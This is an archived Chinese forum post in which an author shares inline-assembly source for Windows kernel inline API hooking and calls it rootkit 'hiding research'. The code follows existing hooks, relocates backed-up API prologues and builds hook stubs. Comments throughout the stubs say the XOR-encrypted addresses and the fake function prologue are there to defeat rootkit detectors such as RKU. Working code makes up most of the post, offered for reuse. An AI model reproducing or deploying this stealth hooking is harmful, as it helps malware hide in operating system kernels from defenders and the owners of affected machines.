
# HSQARKH 完整源码

> 原文：[`www.pediy.com/kssd/pediy10/64862.html`](https://www.pediy.com/kssd/pediy10/64862.html)

这只是一个初步代码，用来实现 `ARK`，做隐藏方面研究的。

本来打算等自己把所有自己知道的都尽量用上，再找时机发布，无奈最近平凡被各位大牛打击，实在在信心几近丧失殆尽。暂时不想再搞这了，贻笑大方也罢，索性也把整个小工程源码给发出来，也好让各位牛人说说我是否有再继续搞内核 `ROOTKIT` 研究的必要，是否够入门资格，代码风格是否规范（在现实世界里我从未接触过真正写程序的，我的身边都是搞医学的，真正的 `IT` 世界我丝毫不知，请勿见笑）。

关于这个 `HSQInLineAPI.h` 里面的几个函数我时花了不少时间调试写出来的，如果有人不幸引用了鄙人的简陋代码，还望注明出处。

代码：



# 代码声明

```c
PVOID CheckFixHookedBaseAddress(PVOID);
PVOID GetNativeFunctionBaseAddress(PCWSTR);
DWORD GetFixOpcodeByLength(PVOID,LPVOID,LPVOID,DWORD);
DWORD SetHookAPIHead(LPVOID,PVOID,LPVOID,LPVOID,BYTE);
DWORD FixOpcodeForBackup(LPVOID,LPVOID,DWORD);
```

# 模块：CheckFixHookedBaseAddress

**模块名字**：`PVOID CheckFixHookedBaseAddress(PVOID lpBaseAddress)`  
**模块功能**：对指定的基址试图寻找更合适的 `HOOK` 入口  
**返回数值**：返回合适的 `HOOK` 入口  
**参数说明**：

| 参数名 | 输入/输出 | 参数说明 |
| :--- | :--- | :--- |
| `lpBaseAddress` | `IN` | 正常的需要优化的 `HOOK` 基址 |

**实现代码**：

```c
PVOID CheckFixHookedBaseAddress(PVOID lpBaseAddress)
{
  __asm
  {
    mov    esi, lpBaseAddress
    mov    edi, esi
    mov    ecx, 2        ; 检测前 2 条指令是否含直接跳转, 是则跟进之
  CheckFixHookedBaseAddress_next:    ; 支持更深层次的 Inline HOOK
    push  ecx
    push  eax
    push  esp
    push  esi
    call  LDE32          ; LDE32 会修改 EDX, ECX, EAX,需自己手动保护其值
    pop    edx
    pop    ecx
    cmp    edx, 6
    je    CheckFixHookedBaseAddress_jmp_mem
    cmp    edx, 5
    je    CheckFixHookedBaseAddress_jmp_imm
  CheckFixHookedBaseAddress_jmp_continue:
    add    esi, edx
    loop  CheckFixHookedBaseAddress_next
    jmp    CheckFixHookedBaseAddress_quit
  CheckFixHookedBaseAddress_jmp_imm:
    lodsb
    dec    edx
    cmp    al, 0xe9
    jne    CheckFixHookedBaseAddress_jmp_continue
    lodsd
    add    eax, esi        ; 需修正跳转地址
    jmp    CheckFixHookedBaseAddress_new_addr
  CheckFixHookedBaseAddress_jmp_mem:
    lodsw
    cmp    ax, 0x25ff
    jne    CheckFixHookedBaseAddress_quit
    lodsd
    mov    eax, dword ptr [eax]
  CheckFixHookedBaseAddress_new_addr:
    push  eax
    pop    lpBaseAddress
  CheckFixHookedBaseAddress_quit:
  }
  return lpBaseAddress;
}
```

# 模块：GetNativeFunctionBaseAddress

**模块名字**：`PVOID GetNativeFunctionBaseAddress(IN PCWSTR pusNativeKeJmpFunctionName)`  
**实现代码**：

```c
PVOID GetNativeFunctionBaseAddress(IN PCWSTR pusNativeKeJmpFunctionName)
{
  UNICODE_STRING usFunctionName;
  RtlInitUnicodeString(&usFunctionName, pusNativeKeJmpFunctionName);
  return CheckFixHookedBaseAddress(MmGetSystemRoutineAddress(&usFunctionName));
}
```

# 模块：SetHookAPIHead

**模块名字**：`DWORD SetHookAPIHead(LPVOID lpOpcode,PVOID lpBuffer,LPVOID lpParam,LPVOID lpHookAPI,BYTE bAPICount)`  
**模块功能**：设置被 `Inline HOOK` 的 `API` 头  
**返回数值**：返回实际设置 `Inline HOOK` 的 `API` 头指令串长度  
**参数说明**：

| 参数名 | 输入/输出 | 参数说明 |
| :--- | :--- | :--- |
| `lpOpcode` | `IN` | 需要处理的操作码基址(即原 `API` 的 `EPO`) |
| `lpBuffer` | `OUT` | 接受 `Inline HOOK` 的 `API` 头指令串的本地缓冲区地址 |
| `lpParam` | `IN` | 远程参数缓冲区地址,(没有可以为 `NULL`) |
| `lpHookAPI` | `IN` | `HOOK API` 代码所存放的远程参数缓冲区地址 |
| `bAPICount` | `IN` | 被 `Inline HOOK` 的原 `API` 需要传入的实际参数数目 |

**更新日志**：
*   2008-05-13: 自动生成最优化 `HOOK` 头, 增加对 `EAX` 的保存,使之支持更深层次的 `Inline HOOK`

**实现代码**：

```c
DWORD SetHookAPIHead(LPVOID lpOpcode,PVOID lpBuffer,LPVOID lpParam,LPVOID lpHookAPI,BYTE bAPICount)
{
  LARGE_INTEGER dwSeed;
  #if WIN32_VERSION
  QueryPerformanceCounter(&dwSeed);
  #else
  KeQueryPerformanceCounter(&dwSeed);
  #endif
  __asm
  {
    mov    ecx, dwSeed.HighPart
    mov    eax, dwSeed.LowPart
    add    ecx, eax
    ror    ecx, cl        ; 产生随机数
    mov    eax, ecx
  ;===============================================================================
    push  lpHookAPI       ; 开始填写可变参数
    push  lpParam
    lea    edx, SHQ_HookParam
    pop    dword ptr [edx]
    xor    dword ptr [edx], eax
    lea    edx, SHQ_HookProc
    pop    dword ptr [edx]
    xor    dword ptr [edx], eax ; 用随机密钥加密两个地址参数,加强检测难度
    cld
    lea    edi, SHQ_AddressKey
    stosd
    lea    edi, SHQ_ClsESP
    mov    al, bAPICount
    shl    al, 2
    stosb
    lea    edi, SHQ_FuckESP
    stosb           ; 填写可变参数完毕
    call  SHQ_SaveData
  ;===============================================================================
  ;###############################################################################
    mov     edi, edi    ; 8B FF
    push    ebp         ; 55
    mov     ebp, esp    ; 8B EC 伪扮入口标志,加强检测难度
    pop    ebp          ; 保存 EBP (伪装时必需)

    xchg  eax, dword ptr [esp] ; 保存返回地址(这个很重要), 同时入栈保存 EAX
          ; 在深层 HOOK 时,有时 EAX 也可能是跳转表的索引,故需保存之
          ; 2008-05-12 增加对 EAX 的保存
    push    ecx
    push    edx         ; 保护 EBX, ECX,可以兼容 fastcall api

  SHQ_HookParam_Fix:
    _emit  0x68
  SHQ_HookParam:
    DD_ADRESS        ; push    lpParam  ; 传入 HOOK 参数
          ; ◆注:重定位和跳转也成为 RKU 检测 Line hook 的标志◆
    _emit  0x68      ; 不使用这些, 其实这样更省空间
  SHQ_AddressKey:        ; 栈中解析地址,加强检测难度
    DD_ADRESS        ; push  dword ptr [SHQ_AddressKey]
    pop    ecx        ; 取得解码 Key
  SHQ_HookParam_Fix_Sec:
    _emit  0x31      ; 地址解码
    _emit  0x0c
    _emit  0x24      ; xor   dword ptr [esp], ecx
    push  eax        ; 修正返回地址
  SHQ_BackAddress:
    _emit  0x83
    _emit  0xEC      ; 平衡堆栈

  SHQ_FuckESP:        ; 制造假象申请局部栈空间的同时,能保留压入的参数共 HOOK 使用
    _emit  0x00      ; sub     esp, x
  SHQ_FuckESP_Fix:
    _emit  0x68
  SHQ_HookProc:
    DD_ADRESS        ; push  eax, lpHookAPI  ; 设置真正的跳转地址
    _emit  0x31      ; 地址解码
    _emit  0x0c
    _emit  0x24      ; xor   dword ptr [esp], ecx
  SHQ_HookProc_Fix:

    push  ebp        ; 模拟原 API 返回前恢复原 EBP (不仅实现了跳转,还恢复了 EBP)
    mov    ebp, esp    ; 将 HOOK 代码做成正常调用退出格式,加强检测难度

    _emit  0x0c9     ; leave 由于无法编译通过,只好采用机器码(WIN32 时却可以)
    ;leave          ; mov   esp, ebp  ; 主要目的是设置 ESP 指针
          ; pop   ebp      ; 在 ESP 指定的位置恢复 EBP
    _emit  0x0c2     ; ret  x  =>  pop  eip
          ;        add  esp, x

  SHQ_ClsESP:
    DW_DATA          ; x
  ;###############################################################################
  SHQ_SaveData:        ; 保存 HOOK 头数据
    pop    ecx
    ;--------------------------------------------------------------------------------
    mov    edi, lpOpcode          ; 生产最优化 HOOK 头,指令实时修正保存
    test  edi, edi
    je    SHQ_SaveData_Exit
    mov    esi, edi
    cld
    xor    edx, edx            ; EDX 作为属否含有 PROC 的标志(默认为 0,表无)
    lodsw
          ; 检测是否需要添加不必要的 API 入口伪装头
          ; 尽量减小 HOOK 头尺寸
    cmp    ax, 0FF8Bh          ; 8BFF      mov     edi, edi
    jne    SHQ_SaveData_Nt      ; 据说 NT 以上 MS 才添加了这个,方便大家 HOOK
    or    dl, 01b            ; 设置标志: -> XP
  SHQ_SaveData_Nt:
    lodsb            ; 55    push    ebp
    cmp    al, 55h
    je    SHQ_SaveData_Proc
    lodsw
    jmp    SHQ_SaveData_Proc_Head
  SHQ_SaveData_Proc:
    lodsw
    cmp    ax,  0EC8Bh          ; 8BEC    mov     ebp, esp
    jne    SHQ_SaveData_Proc_Head
    sub    esi, 3+1            ; 有 PROC 时,需要 POP EBP -> (+1)
    or    dl, 10b            ; 设置标志: ->标准的 PROC
    and    dl, 01b            ; 检测是否为旧的 OS 的 PROC
    je    SHQ_SaveData_Proc_Head
    sub    esi, 2
  SHQ_SaveData_Proc_Head:
    lodsb            ; 默认不需要 POP EBP
    sub    esi, edi
    add    esi, ecx            ; 得到最优 HOOK 头基址
    mov    edi, lpBuffer

    lea    ecx, SHQ_HookParam_Fix
    sub    ecx, esi
    rep    movsb
    mov    eax, lpParam
    test  eax, eax            ; 如果 HookParam=NULL,可以精简指令为
    jne    SHQ_SaveData_ParamExist
    mov    ax, 6Ah            ; 6A 00         push    0
    stosw
    add    esi, 5
    lea    ecx, SHQ_HookParam_Fix_Sec
    sub    ecx, esi
    rep    movsb
    add    esi, 3            ; 0 时无需地址解码
    mov    al, 50h            ; 50            push    eax
    stosb            ; 采用手工完成 push    eax
    jmp    SHQ_SaveData_BackMe
  SHQ_SaveData_ParamExist:
    lea    ecx, SHQ_BackAddress
    sub    ecx, esi
    rep    movsb
  SHQ_SaveData_BackMe:            ; 处理返回 HOOK 调用部分
    test  edx, edx
    jne    SHQ_SaveData_Proc_Back
    add    esi, 4
    lea    ecx, SHQ_HookProc_Fix
    sub    ecx, esi
    rep    movsb
    mov    al, 0c3h
    stosb            ; 无需伪装,直接 RET 跳转调用 HOOK
    jmp    SHQ_SaveData_Exit
  SHQ_SaveData_Proc_Back:
    lea    ecx, SHQ_SaveData        ; 余下的指令都需要
    cmp    bAPICount, 0
    jne    SHQ_SaveData_Proc_Normal
    mov    esi, SHQ_FuckESP_Fix      ; 不用移动 ESP
    sub    ecx, 2            ; 参数个数为 0,又可省 2 BYTE
    mov    byte ptr [ECX-1], 0c3h
  SHQ_SaveData_Proc_Normal:
    sub    ecx, esi
    rep    movsb
  SHQ_SaveData_Exit:
    sub    edi, lpBuffer
    mov    dwSeed.LowPart, edi
    ;--------------------------------------------------------------------------------
  }
  return  dwSeed.LowPart;
}
```

# 模块：GetFixOpcodeByLength

**模块名字**：`GetFixOpcodeByLength(LPVOID,LPVOID,LPVOID,DWORD)`  
**模块功能**：备份被 `Inline HOOK` 的 `API` 头  
**返回数值**：返回实际备份指令串长度, 零表示失败  
**参数说明**：

| 参数名 | 输入/输出 | 参数说明 |
| :--- | :--- | :--- |
| `lpBuffer` | `OUT` | 备份 `API` 的本地缓冲区地址 |
| `lpOpcode` | `IN` | 需要处理的操作码基址(即原 `API` 的 `EPO`) |
| `lpRemoteBuffer` | `IN` | 备份 `API` 的远程缓冲区地址 |
| `dwNumberOfBytes` | `IN` | 需要备份指令串长度 |

**更新日志**：
*   2008-05-11: 在内核环境下当检测到 `ret` 指令,就应该是为该指令串结束标志,不宜继续处理
*   2008-05-08: 增加对长 `CALL`, `JMP` 跳转的检测功能
*   2008-05-03: 增加对 `CALL` 跳转的修正功能
*   2008-04-28: 如果空间不够则,不被 `HOOK`
*   2008-04-27: 由 `HSQ` 花 `12h` 用 `OD` 和 `VC9` 调试通过, 增加了对简单跳转指令的修正功能，及优化代码结构

**实现代码**：

```c
DWORD GetFixOpcodeByLength(PVOID lpBuffer,LPVOID lpOpcode,LPVOID lpRemoteBuffer,DWORD dwNumberOfBytes)
{
  __asm
  {
    push  ebx
    xor    ebx, ebx
    mov    esi, lpOpcode
    test  esi, esi
    je    GetFixOpcodeByLength_exit
    mov    edi, lpBuffer
    mov    ecx, ebx
    cld
  GetFixOpcodeByLength_next:
    push  ecx
    push  esp
    push  esi
    call  LDE32
    pop    ecx
    add    ebx, ecx            ; 累计目前已扫描的指令长度
    cmp    ecx, 2             ; 检测本条指令是否需函数结束指令
    ja    GetFixOpcodeByLength_check
    lodsb
    dec    esi
    cmp    al, 0c2h          ; 若后面只存在少于 5 个 BYTE 不能继续覆盖
    je    GetFixOpcodeByLength_hook_false
    cmp    al, 0c3h
    je    GetFixOpcodeByLength_hook_false
    jmp    GetFixOpcodeByLength_normal
  GetFixOpcodeByLength_hook_false:
    xor    ebx, ebx
    jmp    GetFixOpcodeByLength_exit    ; 无法 Inline HOOK, 退出
  GetFixOpcodeByLength_check:
    cmp    ecx, 5             ; 检测本条指令是否需要修正
    jne    GetFixOpcodeByLength_check_jmp
    lodsb
    stosb
    cmp    al, 0XE8
    je    GetFixOpcodeByLength_fix_dword
    jmp    GetFixOpcodeByLength_no_call
  GetFixOpcodeByLength_check_jmp:
    cmp    ecx, 6
    jne    GetFixOpcodeByLength_normal
    lodsw
    stosw
    xchg  ah, al
    cmp    ax, 0FF25h          ; jmp     dword ptr [80554484]
    je    GetFixOpcodeByLength_hook_false
    cmp    ax, 0FF15h          ; call    dword ptr [80554484]
    je    GetFixOpcodeByLength_hook_false  ; 跳转地址属于系统变量, 本可以不加修正
          ; 的直接备份,段很有可能直接跳转到已被
          ; 修改的原入口,而非 HOOK 内部,如果是运行时
          ; 全局常量,则可以修正该地址后 PUSH RET 之.
          ; 暂时为简化处理,显示无法处理,返回失败
    cmp    ax, 0F8Fh          ; 检测是否含有 JXX 指令
    ja    GetFixOpcodeByLength_no_jmp
    cmp    ax, 0F80h          ; 检测是否含有 CALL 指令
    jb    GetFixOpcodeByLength_no_jmp
  GetFixOpcodeByLength_fix_dword:
    lodsd
    add    eax, lpOpcode
    sub    eax, lpRemoteBuffer        ; 需修正跳转
    stosd
    jmp    GetFixOpcodeByLength_continue
  GetFixOpcodeByLength_no_jmp:
    dec    ecx
  GetFixOpcodeByLength_no_call:
    dec    ecx
  GetFixOpcodeByLength_normal:
    rep    movsb              ; 备份当前指令
  GetFixOpcodeByLength_continue:
    cmp    ebx, dwNumberOfBytes
    jb    GetFixOpcodeByLength_next
    mov    al, 0e9h          ; 填加回跳指令
    stosb
    mov    eax, esi
    sub    eax, lpRemoteBuffer
    sub    eax, ebx
    sub    eax, 5
    stosd
  GetFixOpcodeByLength_exit:
    mov    eax, ebx
    pop    ebx
    mov    dwNumberOfBytes, eax
  }
  return dwNumberOfBytes;
}
```

# 模块：FixOpcodeForBackup

**模块名字**：`FixOpcodeForBackup(LPVOID,LPVOID,DWORD)`  
**模块功能**：修正备份 `Inline HOOK` 的 `API` 头  
**返回数值**：返回实际修正指令串长度, 零表示失败  
**参数说明**：

| 参数名 | 输入/输出 | 参数说明 |
| :--- | :--- | :--- |
| `lpOpcode` | `IN` | 需要处理的操作码基址 |
| `lpFixBase` | `IN` | 需修正目标空间的基址 |
| `dwNumberOfBytes` | `IN` | 需修正的指令串长度 |

**实现代码**：

```c
DWORD FixOpcodeForBackup(LPVOID lpOpcode,LPVOID lpFixBase,DWORD dwNumberOfBytes)
{
  __asm
  {
    push  ebx
    xor    ebx, ebx
    mov    esi, lpOpcode
    test  esi, esi
    je    FixOpcodeForBackup_exit
    mov    ecx, ebx
    cld
  FixOpcodeForBackup_next:
    push  ecx
    push  esp
    push  esi
    call  LDE32
    pop    ecx
    add    ebx, ecx            ; 累计目前已扫描的指令长度
    cmp    ecx, 5             ; 检测本条指令是否需要修正
    jne    FixOpcodeForBackup_check_jmp
    lodsb
    cmp    al, 0XE8
    jne    FixOpcodeForBackup_no_call
    jmp    FixOpcodeForBackup_fix_dword
  FixOpcodeForBackup_check_jmp:
    cmp    ecx, 6
    jne    FixOpcodeForBackup_normal
    lodsw
    xchg  ah, al
    cmp    ax, 0F8Fh          ; 检测是否含有 JXX 指令
    ja    FixOpcodeForBackup_no_jmp
    cmp    ax, 0F80h          ; 检测是否含有 CALL 指令
    jb    FixOpcodeForBackup_no_jmp
  FixOpcodeForBackup_fix_dword:
    mov    edi, esi
    lodsd
    add    eax, lpFixBase
    sub    eax, lpOpcode          ; 需修正跳转
    stosd
    jmp    FixOpcodeForBackup_continue
  FixOpcodeForBackup_no_jmp:
    dec    ecx
  FixOpcodeForBackup_no_call:
    dec    ecx
  FixOpcodeForBackup_normal:
    add    esi, ecx
  FixOpcodeForBackup_continue:
    cmp    ebx, dwNumberOfBytes
    jb    FixOpcodeForBackup_next
  FixOpcodeForBackup_exit:
    mov    eax, ebx
    pop    ebx
    mov    dwNumberOfBytes, eax
  }
  return dwNumberOfBytes;
}
```



by HSQ 22:03 2008-5-14

于湖北宜昌 XXX 网吧

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `4.01.rar`

 |
